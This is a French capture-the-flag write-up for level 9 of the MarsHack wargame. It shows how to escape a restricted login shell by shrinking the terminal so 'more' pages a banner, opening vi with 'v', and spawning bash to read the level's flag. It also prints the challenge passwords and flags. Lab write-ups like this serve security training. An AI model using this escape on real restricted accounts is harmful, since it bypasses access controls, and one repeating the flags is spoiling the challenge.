# Write up : Wargames

### Level 9

Consigne :

```
Consignes lvl9 :<br>
Le but de ce challenge est d'obtenir un shell avec l'utilisateur challenge9 en utilisant le binaire autorisé qui est visible via la commande 'sudo -l'.<p>
L'utilisateur suivant est un peu spécial, bien vérifier ce qui se lance lors d'une connexion ssh avant de faire quoi que ce soit.<br>
Il faut lire le fichier dans le homedir de l'utilisateur afin d'obtenir le flag.

Se connecter à l'adresse suivante : <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<FONT COLOR="#ff0000">ssh -p 6666 challenge9@game1.marshack.fr</FONT> <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password : [flag obtenu dans l'épreuve précédente]
```

Connexion

```
ssh -p 6666 challenge9@game1.marshack.fr
password: MARS{9QujEQOSZFrRf2PAhHre9KbUFfvVeox1}
```



Affichage du challenge

```
(int)
__  __                        _    _            _
|  \/  |                 ____ | |  | |          | |
| \  / | __ _ _ __ ___  / __ \| |__| | __ _  ___| | __
| |\/| |/ _` | '__/ __|/ / _` |  __  |/ _` |/ __| |/ /
| |  | | (_| | |  \__ \ | (_| | |  | | (_| | (__|   <
|_|  |_|\__,_|_|  |___/\ \__,_|_|  |_|\__,_|\___|_|\_\
                        \____/

>>>> Et si vous reduisiez la fenêtre !!!
>>>> Danger de more

(int)
```

Le shell de l'utilisateur challenge9 a été remplacé par un binaire qui affiche une large banner puis quitte immédiatement. On est donc déconnecté.

Nouvelle tentative de connexion :

- Reduire la taille de la console : more est utilisé. 

  Il y a une faiblesse relative au binaire 'more' 

- Appuyez sur 'v' (v minuscule).

- Cela nous permet de récupérer un vi



Dans vi tapez les commandes :

```
:set shell=/bin/bash
:shell
```

Vous êtes maintenant connecté.

Affichons le contenu du répertoire .

```bash
challenge9@7051d181892c:~$ ls -al
total 24
drwxr-x--- 1 root challenge9 4096 janv. 26 11:41 .
drwxr-xr-x 1 root root       4096 janv. 26 11:41 ..
-rw-r----- 1 root challenge9 3084 oct.  28 10:10 banner.txt
-rw-r----- 1 root challenge9   39 oct.  30 17:07 .passwd

```

Lecture du fichier .passwd

```
challenge9@7051d181892c:~$ cat .passwd

MARS{PDaJS6MkwQMd5N5o5ILQld0Ue1mxm90T}
```



Résultat : MARS{PDaJS6MkwQMd5N5o5ILQld0Ue1mxm90T}